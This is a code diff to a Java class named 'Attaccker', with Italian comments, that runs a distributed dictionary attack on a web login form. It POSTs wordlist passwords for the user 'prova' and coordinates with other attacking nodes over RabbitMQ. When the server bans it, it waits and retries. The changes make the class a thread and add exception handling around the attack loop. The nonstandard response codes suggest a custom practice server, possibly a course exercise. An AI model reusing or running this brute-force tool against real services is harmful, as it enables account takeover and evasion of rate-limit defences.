@@ -30,7 +30,7 @@ import com.rabbitmq.client.Envelope;
 
 import java.util.concurrent.TimeUnit;
 
-public class Attaccker {
+public class Attaccker implements Runnable {
 
 	private List<String> cookies;
 	private HttpURLConnection conn;
@@ -55,6 +55,7 @@ public class Attaccker {
 	private String passwToSend[] = new String[3]; // array che contiene gli indici delle password che verranno mandate
 													// tramite POST
 	private int response[] = new int[3]; // array che contiene gli stati http
+	private Thread t;
 
 	public Attaccker(String url, String login, String dictonary, String exName, String name)
 			throws IOException, TimeoutException {
@@ -82,17 +83,36 @@ public class Attaccker {
 
 	// String result = http.GetPageContent(login);
 	// System.out.println(result);
+	
+	public void start () {
+	      if (t == null) {
+	         t = new Thread (this);
+	         t.start ();
+	      }
+	   }
 
-	public void start() throws Exception {
+	public void run() {
 		
 		// make sure cookies is turn on
 		CookieHandler.setDefault(new CookieManager());
 
 		// 1. Send a "GET" request, so that you can extract the form's data.
-		String page = this.GetPageContent(url);
+		String page = null;
+		try {
+			page = this.GetPageContent(url);
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 
 		// String[] data = readDictonaryAttack(dictonary);
-		ArrayList<String> data = readDictonaryAttack(dictonary);
+		ArrayList<String> data = null;
+		try {
+			data = readDictonaryAttack(dictonary);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 
 		for (int i = 0; i < 3; i++)
 			passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
@@ -100,36 +120,78 @@ public class Attaccker {
 		while (getPasswFound() == false) {
 
 			for (int i = 0; i < 3; i++) {
-				String postParams = this.getFormParams(page, "prova", passwToSend[i]);
-				response[i] = this.sendPost(login, postParams);
+				String postParams = "";
+				try {
+					postParams = this.getFormParams(page, "prova", passwToSend[i]);
+				} catch (UnsupportedEncodingException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				try {
+					response[i] = this.sendPost(login, postParams);
+				} catch (Exception e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
 			}
 
 			// Qui si deve considerare response[] ed agire di conseguenza.
 			for (int i = 0; i < response.length; i++) {
 				if (response[i] == 200) {
 					// password trovata, inviarla! passwToSend[i] è la password
-					sendMessage("OKAY;"+passwToSend[i]);
+					try {
+						sendMessage("OKAY;"+passwToSend[i]);
+					} catch (IOException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
 					setPasswFound(true);
 				} else if (response[i] == 271) {
 					// 0. inviare password agli altri nodi
-					sendMessage(passwToSend[i]);
+					try {
+						sendMessage(passwToSend[i]);
+					} catch (IOException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
 					// 1. Aggiornare la password che ha ritornato errore di autenticazione
 					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
 				} else if (response[i] == 270) {
 					// 0. invio indici provati agli altri nodi
-					sendMessage(passwToSend[i]);
+					try {
+						sendMessage(passwToSend[i]);
+					} catch (IOException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
 					// 1. Aggiornare la password che ha ritornato errore di autenticazione
 					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
 					ban = true;
 				}
 
 				if (ban) {
-					String postParams = this.getFormParams(page, "prova", "a");
+					String postParams = "";
+					try {
+						postParams = this.getFormParams(page, "prova", "a");
+					} catch (UnsupportedEncodingException e1) {
+						// TODO Auto-generated catch block
+						e1.printStackTrace();
+					}
 					int a = 0;
 					do {
 						// sleep x secondi prima di ritentare
-						TimeUnit.SECONDS.sleep(25);
-						a = this.sendPost(login, postParams);
+						try {
+							TimeUnit.SECONDS.sleep(25);
+						} catch (InterruptedException e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						}
+						try {
+							a = this.sendPost(login, postParams);
+						} catch (Exception e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						}
 					} while (a == 270);
 				}
 			}
@@ -205,8 +267,8 @@ public class Attaccker {
 
 		int responseCode = conn.getResponseCode();
 		//System.out.println("\nSending 'POST' request to URL : " + url);
-		System.out.println("Post parameters : " + postParams);
-		System.out.println("Response Code : " + responseCode);
+		System.out.println(name + ": Post parameters : " + postParams);
+		System.out.println(name + ": receive the following Response Code : " + responseCode);
 
 		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 		String inputLine;
@@ -240,7 +302,7 @@ public class Attaccker {
 				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
 			}
 		}
-		int responseCode = conn.getResponseCode();
+		//int responseCode = conn.getResponseCode();
 		//System.out.println("\nSending 'GET' request to URL : " + url);
 		//System.out.println("Response Code : " + responseCode);
 
